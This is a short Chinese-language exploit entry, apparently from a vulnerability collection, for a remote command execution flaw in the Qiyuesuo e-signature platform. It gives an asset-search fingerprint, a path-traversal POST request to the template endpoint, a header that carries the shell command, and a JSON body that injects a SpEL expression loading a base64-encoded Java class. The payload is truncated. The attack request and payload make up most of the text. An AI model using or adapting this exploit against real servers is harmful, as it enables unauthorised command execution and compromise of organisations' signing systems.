# 契约锁template存在远程命令执行漏洞

- **系统**：契约锁　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="契约锁-电子签署平台"`
- **请求**：`POST /login/%2e%2e/template/html/add HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`X-State: id`　`Content-Length: 9839`

**请求体 / payload**
```
{"file": "1", "title": "2", "params": {"extensionParam": "{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VCAob3JnLnNwcmluZ2ZyYW1ld29yay5jZ2xpYi5jb3JlLlJlZmxlY3RVdGlscykuZGVmaW5lQ2xhc3MoIlF5c1Rlc3QiLFQgKG9yZy5zcHJpbmdmcmFtZXdvcmsudXRpbC5CYXNlNjRVdGlscykuIGRlY29kZUZyb21TdHJpbmcoInl2NjZ2Z0FBQURJQktBb0FJUUNXQ0FDWENnQ1lBSmtLQUpnQW1nb0Ftd0NjQ0FDZENnQ2JBSjRIQUo4SUFLQUlBS0VJQUtJSUFLTUtBQjhBcEFvQXBRQ21DQUNuQ2dDWUFLZ0tBS1VBcVFjQWd3b0FtQUNxQ0FDckNnQXNBS3dLQUNFQXJRb0FId0NxQ0FDdUNnQWZBSzhLQUxBQXFnZ0FzUW9BTEFDeUNBQ3pDQUMwQndDMUNnQWZBTFlIQUxjS0FMZ0F1UW…（脚本共 9839 字，完整版见原文）
```

**其他**
- 契约锁template存在远程命令执行漏洞: * [一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 契约锁